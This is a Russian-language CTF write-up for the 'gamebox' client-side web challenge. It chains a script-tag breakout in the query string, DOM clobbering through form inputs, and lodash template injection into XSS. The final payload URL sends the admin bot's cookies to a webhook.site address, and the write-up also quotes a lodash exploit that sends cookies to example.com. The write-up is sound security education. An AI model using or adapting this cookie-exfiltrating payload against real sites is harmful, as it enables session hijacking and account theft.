## gamebox
### insane web clientside

<img width="1552" alt="Screenshot 2022-02-14 at 00 29 34" src="https://user-images.githubusercontent.com/154874/153775852-0bf012a6-5161-4027-8724-653525429f81.png">
https://gamebox.yactf.ru/

Смотрим в исходники, видим скрипт:
```html
<script nonce="09a95263f12e786e3e7a0e7efeb93490">window.jsConf={"query":{},"games":{"selector":".game-thumb"},"ui":{"errSelector":"#error-msg"}}</script>
```
смущает пустой query, пробуем передать что-нибудь в параметрах: `https://gamebox.yactf.ru/?ok=lol` получаем:
```html
<script nonce="7e2e93928890408d248cf4145be7e4d9">window.jsConf={"query":{"ok":"lol"},"games":{"selector":".game-thumb"},"ui":{"errSelector":"#error-msg"}}</script>
```

если внутри iniline скрипта написать `</script>` даже внутри строки, браузер решит что тег закрылся и мы сможем написать произвольный html - пробуем `https://gamebox.yactf.ru/?</script>=1`

<img width="565" alt="Screenshot 2022-02-14 at 00 40 12" src="https://user-images.githubusercontent.com/154874/153776247-998d8a33-0ab1-493b-85ec-caafee7fd88f.png">

работает!

Если просто вставить стандартный xss он не выполнится из за CSP.

Дальше смотрим на `javascripts/index.js`:
```js
'use strict';

// The only purpose of this function is to send amdin the url you'd like him to visit.
// There are no vulnerabilities here.
function sendFeedback(msg) {
  fetch('/api/feedback', {
    method: 'post',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({msg: msg, url: window.location.href})
  }).then(res => res.json())
    .then(res => console.log(res));
}

function showError(err) {
  const tmpl = _.template(document.querySelector(window.jsConf.ui.errSelector).textContent.trim());
  // TODO: show toast
  console.log('err', tmpl({err}));
}

window.addEventListener('message', function(e) {
  if (e.origin !== window.location.origin) {
    return;
  }

  const msg = e.data;
  // TODO: show/hide?
  switch (msg.kind) {
    case 'error':
      showError(msg.err);
      break;
  }
});

window.addEventListener('load', function() {
  function switchGame(gameId) {
    window.game.src = `/game/${gameId}`;
  }

  const games = document.querySelectorAll(window.jsConf.games.selector);
	games.forEach(e => e.addEventListener('click', switchGame.bind(null, e.dataset.gameId)));
  if (games.length > 0) {
    switchGame(games[0].dataset.gameId);
  }
});
```

потом немного тыкаем по сайту и находим в исходниках 404 страницы такой кусок:
```js
<script nonce=9fe14fa462b70f2080f32b9a9dc38832>
  const target = window.opener || window.parent;
  if (!!target) {
    target.postMessage({kind: 'error', err: 'load failed'}, '*');
  }
</script>
```

Если вставить на страницу iframe с несуществующей страницей, то будет вызван showError, iframe мы можем вставить прям из query:
`https://gamebox.yactf.ru/?q[</script><iframe%20src=/404>]=1`

видим в консоле:
```
index.js:15 Uncaught TypeError: Cannot read properties of undefined (reading 'ui')
    at showError (index.js:15:64)
    at index.js:29:7
```

это строка
```js
  const tmpl = _.template(document.querySelector(window.jsConf.ui.errSelector).textContent.trim());
```

ок логично, мы же сломали определениие `window.jsConf` тем что закрыли тег script.

```html
<script nonce="fcd03ea90c8860dfd30890ce5c2998b2">
  window.jsConf={"query":{"q":{"
</script>
<iframe src=/404>
":"1"}},"games":{"selector":".game-thumb"},"ui":{"errSelector":"#error-msg"}}</script>
```

Вернёмся пока к _.template, быстро гуглится что если мы можем задать текст шаблона - то можем выполнить [любой код](https://web.archive.org/web/20211004200531/https:/github.com/lodash/lodash/issues/5261)

Значит нам нужно как-то определить `window.jsConf.ui.errSelector` не используя `<script />`

Тут я залип где-то на сутки)

Потом вспомнил что если дать элементу в html id то он будет доступен под ним в window, типа:
```html
<div id="jsConf"></div>
<script>
  console.log(window.jsConf) //определенно
</script>
```

Но это работает только на один уровень, если внутри одного div сделать другой с id то иерархии не создатся.

Пошёл читать [спеку](https://html.spec.whatwg.org/multipage/forms.html#the-form-element) там нашлось что инпуты в форме тоже доступны по их id/name

<img width="1210" alt="Screenshot 2022-02-14 at 01 06 48" src="https://user-images.githubusercontent.com/154874/153777299-3cc6691e-6897-4b7c-ae4c-ca9296b584de.png">

Ок - делаем:
`https://gamebox.yactf.ru/?q[</script><iframe%20src=/404></iframe><form%20id=jsConf><input%20id=ui>]=1`
получаем:

<img width="604" alt="Screenshot 2022-02-14 at 01 12 58" src="https://user-images.githubusercontent.com/154874/153777489-fa0c9924-7d31-4595-917c-d57249351a7e.png">

Тут я очень долго читал спеку пытаясь придумать как определить уже errSelector но проиграл.

НО js же любит приводить всё к строкам, а undefined - вполне валидный css селектор, который выбирает элемент `<undefined>`

пробуем:
`https://gamebox.yactf.ru/?q[</script><iframe%20src=/404></iframe><form%20id=jsConf><input%20id=ui></form><undefined>omfg</undefined>]=1`

Иии в консоле появляется `omfg`!

дальше уже дело техники, берём примет эксплойта для lodash
```js
_.template("<%-);window.location='http://example.com/?q='+document.cookie//%>")
```
и вставляем его в наш `undefined`, и надо не забыть заурлэнкодить `%` - получается:
`https://gamebox.yactf.ru/?q[</script><form%20name=jsConf><input%20name=ui></form><iframe%20src=/omg></iframe><undefined><%25-);window.location=%27https://webhook.site/4ea69c1e-80e3-4c8d-b8a5-3227af2f0a1e?q=%27%2Bdocument.cookie//%25></undefined>]=1`

скармливаем этот урл боту - и вуаля:

<img width="593" alt="Screenshot 2022-02-14 at 01 25 46" src="https://user-images.githubusercontent.com/154874/153777936-ccb86689-a6ba-4941-a8ad-dc317821b070.png">


